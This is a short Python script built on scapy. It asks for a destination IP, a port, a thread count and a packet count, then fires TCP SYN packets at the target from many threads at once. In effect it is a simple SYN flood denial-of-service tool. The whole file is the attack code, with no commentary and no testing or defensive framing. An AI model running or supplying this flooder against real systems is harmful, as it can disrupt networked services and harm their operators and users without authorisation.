import scapy.all as scapy
import threading

def send_syn_packet(dst_ip, dst_port):
    syn_packet = scapy.IP(dst=dst_ip)/scapy.TCP(dport=dst_port, flags="S")
    scapy.send(syn_packet)

def main():
    dst_ip = input("Enter the destination IP: ")
    try:
        dst_port = int(input("Enter the destination port(80=tcp;25=SMTP): "))
        num_threads = int(input("Enter the number of threads: "))
        num_packets = int(input("Enter the number of packets to send: "))
    except ValueError:
        print("Invalid input. Please enter valid integers.")
        return

    # Create and start threads
    threads = []
    for _ in range(num_threads):
        for _ in range(num_packets):
            thread = threading.Thread(target=send_syn_packet, args=(dst_ip, dst_port))
            threads.append(thread)
            thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
